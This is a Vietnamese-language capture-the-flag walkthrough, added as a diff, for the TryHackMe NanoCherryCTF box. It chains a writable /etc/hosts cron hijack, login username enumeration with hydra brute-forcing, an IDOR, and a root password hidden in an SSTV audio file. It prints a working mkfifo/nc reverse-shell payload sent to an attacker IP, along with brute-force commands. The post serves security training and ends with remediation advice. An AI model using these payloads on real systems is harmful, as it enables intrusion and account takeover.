@@ -1,0 +1,208 @@
+---
+title: 'NanoCherryCTF'
+description: 'Một /etc/hosts ghi được chiếm quyền một cronjob curl-pipe-bash để di chuyển ngang, username enumeration và một IDOR rải mật khẩu root ra bốn user, và một file WAV mã hóa SSTV cuối cùng giao ra mật khẩu root.'
+date: 2026-01-10
+platform: tryhackme
+room: 'NanoCherryCTF'
+roomUrl: 'https://tryhackme.com/room/nanocherryctf'
+difficulty: medium
+tags:
+  - 'web'
+  - 'idor'
+  - 'steganography'
+  - 'password-cracking'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'username enumeration'
+  - 'insecure direct object reference'
+  - 'insecure command execution'
+  - 'security through obscurity'
+translation: done
+draft: false
+---
+
+## **NanoCherryCTF — Một Cron curl|bash, Một IDOR, và Mật Khẩu Root Giấu Trong Âm Thanh**
+
+_Một bài walkthrough cho box "NanoCherryCTF" của TryHackMe. Chủ đề thật sự là security through obscurity làm sai cách: một mật khẩu root bị chia thành các mảnh rải ra bốn user riêng biệt, mỗi user tiếp cận được độc lập. Ta nhảy đảo từ_ _`notsus`_ _bằng cách chiếm một cron_ _`curl | bash`_ _qua một_ _`/etc/hosts`_ _ghi được, enum một admin user ẩn và brute nó, kéo credential của user thứ tư qua một IDOR, rồi gồm đủ mọi mảnh mật khẩu — và giải mật khẩu root cuối cùng ra khỏi một file âm thanh SSTV._
+
+> Flag, mật khẩu đã crack, và IP mục tiêu được ẩn. NanoCherryCTF là box huấn luyện hợp pháp trên TryHackMe; mọi thao tác đều thực hiện trên một mục tiêu luyện tập được cho phép. Flag hiển thị dạng `THM{<redacted>}` và các bí mật thu được dạng `<redacted>` — có thật trên box nhưng ẩn ở đây.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Fuzz vhost tìm ra `nano.cherryontop.thm` với một admin panel và một `command.php` sau đăng nhập, cho một SSH foothold ban đầu với tư cách **`notsus`** → `/etc/crontab` cho thấy **`bob-boba`** **chạy** **`curl cherryontop.tld:8000/... | bash`** mỗi phút, và `/etc/hosts` **ghi được**, nên ta trỏ `cherryontop.tld` về máy mình, phục vụ một `coinflip.sh` reverse-shell, và trở thành **`bob-boba`** (mảnh mật khẩu 3) → trang login nano làm lộ user hợp lệ ("This user doesn't exist"), nên ta enum ra `puppet` và brute mật khẩu nó, đăng nhập panel lấy credential của **molly-milk**, rồi SSH vào (mảnh 1) → `content.php?facts=<id>&user=<base32>` là một **IDOR**: mã hóa `sam-sprinkles` sang Base32, fuzz id, và lấy credential của **sam-sprinkles** (mảnh 2) → nối ba mảnh để đăng nhập thành **chad-cherry** → `rootPassword.wav` của anh ta là một truyền **SSTV**; giải mã thành một ảnh ghi rõ **mật khẩu root** → `su root`.
+
+`/etc/hosts` ghi được → cron hijack → user enum + brute → IDOR → gồm mật khẩu bị chia → SSTV stego → root.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-vpn-ip>
+```
+
+Chỉ SSH và Apache mở. Trang web cần một hostname, nên ta thêm `cherryontop.thm` vào file hosts và fuzz virtual host:
+
+```text
+80/tcp open  http  Apache httpd 2.4.52 (Ubuntu)  — "Cherry on Top Ice Cream Shop"
+22/tcp open  ssh   OpenSSH 8.9p1 Ubuntu
+```
+
+```text
+ffuf -u http://cherryontop.thm -H 'Host:FUZZ.cherryontop.thm' \
+     -w subdomains-top1million-110000.txt -fw 5633
+# nano   [Status: 200, Size: 10718]
+```
+
+`nano.cherryontop.thm` là một admin portal; quét thư mục sau login của nó lộ ra `login.php` và một `command.php`. Enum panel cho một SSH foothold ban đầu với tư cách user quyền thấp **`notsus`**, trong home có một ghi chú thân thiện đẩy ta về phía `bob-boba`.
+
+### **Lỗ hổng — bí mật được giấu thay vì được bảo vệ**
+
+Cả box dựa vào obscurity: một mật khẩu root chia thành mảnh giao cho các user khác nhau, một tài khoản admin ẩn, các bản ghi được địa chỉ bằng username Base32, và một bí mật cuối cùng chôn trong một file âm thanh. Không cái nào là kiểm soát truy cập thật.
+
+<Callout type="insight">
+
+Giấu một bí mật không giống với bảo vệ nó. Một **`/etc/hosts`** **ghi được** biến một cron `curl | bash` thành thực thi mã từ xa; một form login phân biệt "không có user" với "sai mật khẩu" là một **oracle enum user** miễn phí; một endpoint định khóa bằng một id đoán được và một username mã Base32 là một **IDOR**; và một mật khẩu "giấu" dưới dạng một tín hiệu SSTV chỉ cách plaintext một lệnh `sstv -d`. Chia một mật khẩu ra nhiều user chỉ thêm bước, không thêm bảo mật.
+
+</Callout>
+
+### **Bước 1 — chiếm cron curl|bash qua /etc/hosts ghi được**
+
+Với tư cách `notsus`, crontab hệ thống cho thấy một job chạy dưới `bob-boba` mỗi phút, pipe một script từ xa thẳng vào bash:
+
+```text
+cat /etc/crontab
+# *  *  * * *   bob-boba   curl cherryontop.tld:8000/home/bob-boba/coinflip.sh | bash
+```
+
+`/etc/hosts` ghi được, nên ta cho `cherryontop.tld` trỏ về mình và phục vụ đúng đường dẫn:
+
+```text
+echo '$ATTACKER_IP cherryontop.tld' >> /etc/hosts
+```
+
+```text
+# attacker: serve the hijacked script and catch the shell
+mkdir -p home/bob-boba
+cat > home/bob-boba/coinflip.sh <<'EOF'
+#!/bin/bash
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ATTACKER_IP 4445 >/tmp/f
+EOF
+python3 -m http.server 8000
+nc -lnvp 4445
+```
+
+Trong vòng một phút, cron kéo [_coinflip.sh_](http://coinflip.sh/) _của ta_ và ta trở thành `bob-boba`, nắm mảnh mật khẩu thứ ba và một file log:
+
+```text
+bob-boba@...:~$ cat chads-key3.txt   # segment 3: <redacted>
+```
+
+### **Bước 2 — enum và brute user panel ẩn (→ molly-milk)**
+
+Trang login nano trả về thông báo khác nhau cho user không tồn tại so với sai mật khẩu — một oracle enum user. Hydra tìm ra một tài khoản hợp lệ, rồi crack mật khẩu của nó:
+
+```text
+hydra -L xato-net-10-million-usernames.txt -p asdf nano.cherryontop.thm \
+  http-post-form "/login.php:username=^USER^&password=^PASS^&submit=:F=This user doesn't exist"
+# login: puppet
+hydra -l puppet -P rockyou.txt nano.cherryontop.thm \
+  http-post-form "/login.php:username=^USER^&password=^PASS^&submit=:Bad password"
+# puppet : <redacted>
+```
+
+Đăng nhập với tư cách `puppet` lộ ra nội dung panel, bao gồm mật khẩu của **molly-milk**. Ta SSH vào và lấy mảnh đầu tiên:
+
+```text
+ssh molly-milk@cherryontop.thm
+molly-milk@...:~$ cat chads-key1.txt   # segment 1: <redacted>
+```
+
+### **Bước 3 — IDOR trên content.php (→ sam-sprinkles)**
+
+`content.php` của site chính phục vụ các bản ghi theo id số `facts` và một `user` mã Base32. Đổi user sang tài khoản khác và brute id làm lộ dữ liệu của họ. Mã hóa `sam-sprinkles` sang Base32 và fuzz:
+
+```text
+seq 10000 > ids.txt
+ffuf -u 'http://cherryontop.thm/content.php?facts=FUZZ&user=ONQW2LLTOBZGS3TLNRSXG===' \
+     -w ids.txt -mc all -fr "Error"
+# id 43 -> sam-sprinkles credentials
+```
+
+ID 43 trả về login của `sam-sprinkles`. SSH vào lấy mảnh thứ hai:
+
+```text
+ssh sam-sprinkles@cherryontop.thm
+sam-sprinkles@...:~$ cat chads-key2.txt   # segment 2: <redacted>
+```
+
+### **Bước 4 — ghép mật khẩu bị chia (→ chad-cherry)**
+
+Ba ghi chú nói rõ: mật khẩu SSH của chad bị chia ba phần và giao cho molly, sam, và bob. Nối `segment1 + segment2 + segment3` và đăng nhập thành `chad-cherry`:
+
+```text
+ssh chad-cherry@cherryontop.thm   # password = <segment1><segment2><segment3> (redacted)
+chad-cherry@...:~$ cat chad-flag.txt
+# THM{<redacted>}
+chad-cherry@...:~$ ls
+# Hello.txt  rootPassword.wav   <- Hello.txt says the WAV holds the root password
+```
+
+### **Bước 5 — giải mật khẩu root từ một file âm thanh SSTV**
+
+Xem trong Audacity, `rootPassword.wav` hiện một mẫu kỹ thuật số trong spectrogram — đó là một truyền **SSTV** (slow-scan television). Giải mã thành một ảnh:
+
+```text
+scp chad-cherry@cherryontop.thm:/home/chad-cherry/rootPassword.wav .
+git clone https://github.com/colaclanth/sstv.git && cd sstv
+python3 -m venv venv && source venv/bin/activate && python3 setup.py install
+sstv -d ../rootPassword.wav -o root.png
+# [sstv] Detected SSTV mode Robot 36  ->  decodes an image
+```
+
+Ảnh giải ra ghi rõ mật khẩu root. `su` lên root và đọc flag cuối:
+
+```text
+chad-cherry@...:~$ su root     # password from root.png (redacted)
+root@...:~# cat /root/root-flag.txt
+# THM{<redacted>}
+```
+
+### **Impact**
+
+<Callout type="critical">
+
+**High — CVSS 3.1 8.8** (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`). Một foothold quyền thấp vươn tới root qua một chuỗi kiểm soát dựa trên obscurity:
+
+- **`/etc/hosts`** **ghi được + cron** **`curl | bash`** — thực thi mã tùy ý dưới một user khác, hoàn toàn chắc chắn.
+- **Enum user qua login** — thông báo lỗi khác nhau lộ tài khoản hợp lệ và tiếp cho một lần brute mật khẩu có mục tiêu.
+- **IDOR trên** **`content.php`** — đổi một username Base32 và lặp id làm lộ credential của user khác.
+- **Bí mật được giấu, không được bảo vệ** — một mật khẩu bị chia và một mật khẩu root mã SSTV thêm ma sát nhưng không phòng thủ thật; một khi tiếp cận được, từng mảnh đều đổ.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+1. **Đặt** **`/etc/hosts`** **chỉ root ghi được và đừng bao giờ pipe nội dung từ xa vào một shell.** Tải về một file, xác minh chữ ký/checksum, và chạy từ một đường dẫn tin cậy do root sở hữu.
+2. **Trả về thông báo login giống hệt nhau** cho user không tồn tại và sai mật khẩu, và giới hạn tần suất để chặn enum và brute-force.
+3. **Áp dụng authorization trên** **`content.php`** — gắn mỗi bản ghi với phiên đã xác thực và dùng định danh không đoán được; mã Base32 một username không phải kiểm soát truy cập.
+4. **Đừng dựa vào obscurity.** Chia hay giấu một mật khẩu (kể cả trong audio/stego) không phải một ranh giới bảo mật; dùng xác thực thật và quản lý bí mật đúng cách.
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **`/etc/hosts`** **ghi được là RCE khi có thứ gì đó chạy** **`curl | bash`\*\***.\*\* Chuyển hướng hostname, phục vụ script của bạn, và thừa kế user của cron.
+- **Thông báo login khác nhau là một oracle.** "This user doesn't exist" vs. "Bad password" trao cho attacker một danh sách username đã xác nhận miễn phí.
+- **IDOR cộng một khóa đoán được làm lộ tất cả.** Một username Base32 và một dải id nhỏ là đủ để đi qua mọi bản ghi.
+- **Obscurity không phải bảo mật.** Một mật khẩu chia ra nhiều user hay chôn trong một tín hiệu SSTV chỉ thêm bước — mỗi bước đều khôi phục được.
+
+Cảm ơn bạn đã đọc. NanoCherryCTF là một chuỗi dài nhưng nhẹ nhàng, bài học duy nhất: giấu bí mật — rải ra các user, sau các mã hóa, bên trong âm thanh — không giống với bảo vệ chúng.
